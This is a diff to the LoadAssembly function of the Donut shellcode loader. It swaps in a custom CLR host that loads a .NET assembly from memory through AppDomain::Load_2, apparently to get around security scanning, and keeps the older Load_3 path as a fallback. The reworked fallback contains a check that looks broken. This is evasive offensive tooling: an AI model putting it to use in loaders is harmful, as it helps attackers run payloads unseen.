@@ -29,16 +29,15 @@
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
+#include "custom_host.c" 
+
 BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_MODULE mod, PDONUT_ASSEMBLY pa) {
     HRESULT         hr = S_OK;
-    BSTR            domain;
-    SAFEARRAYBOUND  sab;
-    SAFEARRAY       *sa;
-    DWORD           i;
     BOOL            loaded=FALSE, loadable;
-    PBYTE           p;
     WCHAR           buf[DONUT_MAX_NAME];
+    ICLRRuntimeHost* pCLRHost = NULL;
     
+
     if(inst->api.CLRCreateInstance != NULL) {
       DPRINT("CLRCreateInstance");
       
@@ -60,102 +59,250 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_MODULE mod, PDONUT_ASSEMBLY pa) {
           hr = pa->icri->lpVtbl->IsLoadable(pa->icri, &loadable);
         
           if(SUCCEEDED(hr) && loadable) {
-            DPRINT("ICLRRuntimeInfo::GetInterface");
+            DPRINT("ICLRRuntimeInfo::GetInterface for ICLRRuntimeHost");
           
             hr = pa->icri->lpVtbl->GetInterface(
               pa->icri, 
-              (REFCLSID)&inst->xCLSID_CorRuntimeHost, 
-              (REFIID)&inst->xIID_ICorRuntimeHost, 
-              (LPVOID)&pa->icrh);
+              (REFCLSID)&inst->xCLSID_ICLRRuntimeHost, 
+              (REFIID)&inst->xIID_ICLRRuntimeHost, 
+              (LPVOID*)&pCLRHost);
               
-            DPRINT("HRESULT: %08lx", hr);
+            DPRINT("HRESULT ICLRRuntimeHost: %08lx", hr);
           }
         } else pa->icri = NULL;
       } else pa->icmh = NULL;
     }
-    // fall back on CorBindToRuntime when CLRCreateInstance isn't available
-    // or for example when the above code failed.
-    if(FAILED(hr) || inst->api.CLRCreateInstance == NULL) {
-      DPRINT("Trying CorBindToRuntime");
+
+    if (pCLRHost != NULL && pa->icri != NULL) {
+
+      // Moder Logic (.NET 4.0+): Custom Host with Load2
       
-      hr = inst->api.CorBindToRuntime(
-        NULL,  // load whatever's available
-        NULL,  // load workstation build
-        &inst->xCLSID_CorRuntimeHost,
-        &inst->xIID_ICorRuntimeHost,
-        (LPVOID*)&pa->icrh);
-      
-      DPRINT("HRESULT: %08lx", hr);
-    }
-    
-    if(FAILED(hr)) {
-      pa->icrh = NULL;
-      return FALSE;
-    }
-    DPRINT("ICorRuntimeHost::Start");
-    
-    hr = pa->icrh->lpVtbl->Start(pa->icrh);
-    
-    if(SUCCEEDED(hr)) {     
-      // if no domain name specified
-      if(mod->domain[0] == 0) {
-        DPRINT("ICorRuntimeHost::GetDefaultDomain()");
-        // use the default
-        hr = pa->icrh->lpVtbl->GetDefaultDomain(pa->icrh, &pa->iu);
-      } else {
-        // else create a new domain using the name
-        DPRINT("Domain is %s", mod->domain);
-        ansi2unicode(inst, mod->domain, buf);
-        domain = inst->api.SysAllocString(buf);
-      
-        DPRINT("ICorRuntimeHost::CreateDomain(\"%ws\")", buf);
-      
-        hr = pa->icrh->lpVtbl->CreateDomain(
-          pa->icrh, domain, NULL, &pa->iu);
+      // Load shlwapi.dll
+      HMODULE dll = xGetLibAddress(inst, inst->shlwapi);
+      if(dll == NULL) {
+        DPRINT("DLL %s not found!", inst->shlwapi);
+        return FALSE;
+      }
+
+      // GetProc SHCreateMemStream
+      inst->api.SHCreateMemStream = (SHCreateMemStream_t)xGetProcAddress(inst, dll, inst->shCreateStream, 0);
+      if(inst->api.SHCreateMemStream  == NULL) {
+        DPRINT("Function %s not found!", inst->shCreateStream);
+        return FALSE;
+      }
+
+      ICLRAssemblyIdentityManager* pIdentityMgr = NULL;
+      CLRIdentityManagerProc_t pIdentityManagerProc = NULL;
         
-        inst->api.SysFreeString(domain);
+      DPRINT("Retrieving the GetCLRIdentityManager export.");
+      hr = pa->icri->lpVtbl->GetProcAddress(pa->icri, inst->get_clr, (LPVOID*)&pIdentityManagerProc);
+        
+      if (FAILED(hr) || pIdentityManagerProc == NULL) {
+          DPRINT("Error obtaining GetCLRIdentityManager. HRESULT: %08lx", hr);
+          return FALSE;
+      }
+
+      DPRINT("Calling GetCLRIdentityManager...");
+      hr = pIdentityManagerProc((REFIID)&inst->xIID_ICLRAssemblyIdentityManager, (IUnknown**)&pIdentityMgr);
+        
+      if (FAILED(hr) || pIdentityMgr == NULL) {
+          DPRINT("Error when instantiating ICLRAssemblyIdentityManager. HRESULT: %08lx", hr);
+          return FALSE;
+      }
+
+      DPRINT("Creating an IStream from memory using SHCreateMemStream");
+      IStream* pStream = inst->api.SHCreateMemStream(mod->data, mod->len);
+      if (pStream == NULL) {
+          DPRINT("Error creating IStream with SHCreateMemStream.");
+          pIdentityMgr->lpVtbl->Release(pIdentityMgr);
+          return FALSE;
+      }
+
+      WCHAR szFQN[1024];
+      Memset(szFQN, 0, sizeof(szFQN));
+      DWORD dwBufferSize = 1024;
+
+      DPRINT("Calling GetBindingIdentityFromStream..");
+      hr = pIdentityMgr->lpVtbl->GetBindingIdentityFromStream(pIdentityMgr, pStream, 0, szFQN, &dwBufferSize);
+        
+      if (FAILED(hr)) {
+          DPRINT("GetBindingIdentityFromStream Exception. HRESULT: %08lx", hr);
+          pStream->lpVtbl->Release(pStream);
+          pIdentityMgr->lpVtbl->Release(pIdentityMgr);
+          return FALSE;
+      }
+
+      // Cleaning Temporary Interfaces
+      pStream->lpVtbl->Release(pStream);
+      pIdentityMgr->lpVtbl->Release(pIdentityMgr);
+
+      DPRINT("Identity FQN Extraido via IdentityManager: %ws", szFQN);
+
+      TargetAssembly* targetAssembly = (TargetAssembly*)inst->api.HeapAlloc(inst->api.GetProcessHeap(), 0, sizeof(TargetAssembly));
+      if (!targetAssembly) {
+          DPRINT("Error allocating memory for TargetAssembly.");
+          return FALSE;
+      }
+        
+      targetAssembly->assemblyInfo = szFQN;
+      targetAssembly->assemblySize = mod->len;
+      targetAssembly->assemblyBytes = mod->data;
+
+      // We set up our custom hosting
+      MyHostControl* customHostControl = SetupPICCustomHost(inst, targetAssembly);
+      if (!customHostControl) {
+          DPRINT("Failure on SetupPICCustomHost.");
+          return FALSE;
+      }
+
+      DPRINT("Llamando a SetHostControl...");
+      hr = pCLRHost->lpVtbl->SetHostControl(pCLRHost, (void*)customHostControl);
+      if (FAILED(hr)) {
+          DPRINT("Failure on SetHostControl. HRESULT: %08lx", hr);
+          return FALSE;
+      }
+        
+      DPRINT("Llamando a ICLRRuntimeHost::Start.");
+      hr = pCLRHost->lpVtbl->Start(pCLRHost);
+      if (FAILED(hr)) {
+          DPRINT("Failure on ICLRRuntimeHost::Start. HRESULT: %08lx", hr);
+          return FALSE;
+      }
+        
+      DPRINT("Solicitando interfaz ICorRuntimeHost.");
+      hr = pa->icri->lpVtbl->GetInterface(pa->icri, (REFCLSID)&inst->xCLSID_CorRuntimeHost, (REFIID)&inst->xIID_ICorRuntimeHost, (LPVOID*)&pa->icrh);
+      if (FAILED(hr) || pa->icrh == NULL) {
+          DPRINT("Error obtaining ICorRuntimeHost. HRESULT: %08lx", hr);
+          return FALSE;
+      }
+          
+      DPRINT("Llamando a ICorRuntimeHost::GetDefaultDomain...");
+      hr = pa->icrh->lpVtbl->GetDefaultDomain(pa->icrh, &pa->iu);
+      if (FAILED(hr) || pa->iu == NULL) {
+          DPRINT("Error in GetDefaultDomain. HRESULT: %08lx", hr);
+          return FALSE;
+      }
+            
+      DPRINT("Solicitando interfaz AppDomain desde IUnknown.");
+      hr = pa->iu->lpVtbl->QueryInterface(pa->iu, (REFIID)&inst->xIID_AppDomain, (LPVOID)&pa->ad);
+      if (FAILED(hr) || pa->ad == NULL) {
+          DPRINT("Error retrieving AppDomain. HRESULT: %08lx", hr);
+          return FALSE;
+      }
+                
+      DPRINT("AppDomain::Load_2 calling AssemblyStore with MetaHost FQN.");
+                
+      // We use SysAllocString with FQN string
+      BSTR assemblyName = inst->api.SysAllocString(szFQN);
+      if (assemblyName == NULL) {
+          DPRINT("Error in SysAllocString when allocating a BSTR for the FQN.");
+          return FALSE;
+      }
+                
+      hr = pa->ad->lpVtbl->Load_2(pa->ad, assemblyName, &pa->as);
+      if (FAILED(hr) || pa->as == NULL) {
+          DPRINT("Error in AppDomain::Load_2. HRESULT: %08lx", hr);
+      } else {
+          DPRINT("HRESULT Load_2 : %08lx (Sucessfull)", hr);
+          loaded = TRUE;
+      }
+                
+      inst->api.SysFreeString(assemblyName);
+
+  } else {
+        BSTR            domain;
+        SAFEARRAYBOUND  sab;
+        SAFEARRAY       *sa;
+        DWORD           i;
+        PBYTE           p;
+
+      // fall back on CorBindToRuntime when CLRCreateInstance isn't available
+      // or for example when the above code failed.
+      if(FAILED(hr) || inst->api.CLRCreateInstance == NULL) {
+        DPRINT("Trying CorBindToRuntime");
+        
+        hr = inst->api.CorBindToRuntime(
+          NULL,  // load whatever's available
+          NULL,  // load workstation build
+          &inst->xCLSID_CorRuntimeHost,
+          &inst->xIID_ICorRuntimeHost,
+          (LPVOID*)&pa->icrh);
+        
+        DPRINT("HRESULT: %08lx", hr);
       }
       
-      if(SUCCEEDED(hr)) {
-        DPRINT("IUnknown::QueryInterface");
-        
-        hr = pa->iu->lpVtbl->QueryInterface(
-          pa->iu, (REFIID)&inst->xIID_AppDomain, (LPVOID)&pa->ad);
-          
-        if(SUCCEEDED(hr)) {
-          sab.lLbound   = 0;
-          sab.cElements = mod->len;
-          sa = inst->api.SafeArrayCreate(VT_UI1, 1, &sab);
-          
-          if(sa != NULL) {
-            DPRINT("Copying %" PRIi32 " bytes of assembly to safe array", mod->len);
-            
-            for(i=0, p=sa->pvData; i<mod->len; i++) {
-              p[i] = mod->data[i];
-            }
+      if(FAILED(hr) || pCLRHost == NULL) {
+        pa->icrh = NULL;
+        return FALSE;
+      }
 
-            DPRINT("AppDomain::Load_3");
+      DPRINT("ICorRuntimeHost::Start");
+    
+      hr = pa->icrh->lpVtbl->Start(pa->icrh);
+      
+      if(SUCCEEDED(hr)) {     
+        // if no domain name specified
+        if(mod->domain[0] == 0) {
+          DPRINT("ICorRuntimeHost::GetDefaultDomain()");
+          // use the default
+          hr = pa->icrh->lpVtbl->GetDefaultDomain(pa->icrh, &pa->iu);
+        } else {
+          // else create a new domain using the name
+          DPRINT("Domain is %s", mod->domain);
+          ansi2unicode(inst, mod->domain, buf);
+          domain = inst->api.SysAllocString(buf);
+        
+          DPRINT("ICorRuntimeHost::CreateDomain(\"%ws\")", buf);
+        
+          hr = pa->icrh->lpVtbl->CreateDomain(
+            pa->icrh, domain, NULL, &pa->iu);
+          
+          inst->api.SysFreeString(domain);
+        }
+        
+        if(SUCCEEDED(hr)) {
+          DPRINT("IUnknown::QueryInterface");
+          
+          hr = pa->iu->lpVtbl->QueryInterface(
+            pa->iu, (REFIID)&inst->xIID_AppDomain, (LPVOID)&pa->ad);
             
-            hr = pa->ad->lpVtbl->Load_3(
-              pa->ad, sa, &pa->as);
+          if(SUCCEEDED(hr)) {
+            sab.lLbound   = 0;
+            sab.cElements = mod->len;
+            sa = inst->api.SafeArrayCreate(VT_UI1, 1, &sab);
             
-            loaded = hr == S_OK;
-            
-            DPRINT("HRESULT : %08lx", hr);
-            
-            DPRINT("Erasing assembly from memory");
-            
-            for(i=0, p=sa->pvData; i<mod->len; i++) {
-              p[i] = mod->data[i] = 0;
-            }
-            
-            DPRINT("SafeArrayDestroy");
-            inst->api.SafeArrayDestroy(sa);
+            if(sa != NULL) {
+              DPRINT("Copying %" PRIi32 " bytes of assembly to safe array", mod->len);
+              
+              for(i=0, p=sa->pvData; i<mod->len; i++) {
+                p[i] = mod->data[i];
+              }
+
+              DPRINT("AppDomain::Load_3");
+              
+              hr = pa->ad->lpVtbl->Load_3(
+                pa->ad, sa, &pa->as);
+              
+              loaded = hr == S_OK;
+              
+              DPRINT("HRESULT : %08lx", hr);
+              
+              DPRINT("Erasing assembly from memory");
+              
+              for(i=0, p=sa->pvData; i<mod->len; i++) {
+                p[i] = mod->data[i] = 0;
+              }
+              
+              DPRINT("SafeArrayDestroy");
+              inst->api.SafeArrayDestroy(sa);
           }
         }
       }
     }
-    return loaded;
+  }
+
+  return loaded;
+
 }
     
 BOOL RunAssembly(PDONUT_INSTANCE inst, PDONUT_MODULE mod, PDONUT_ASSEMBLY pa) {
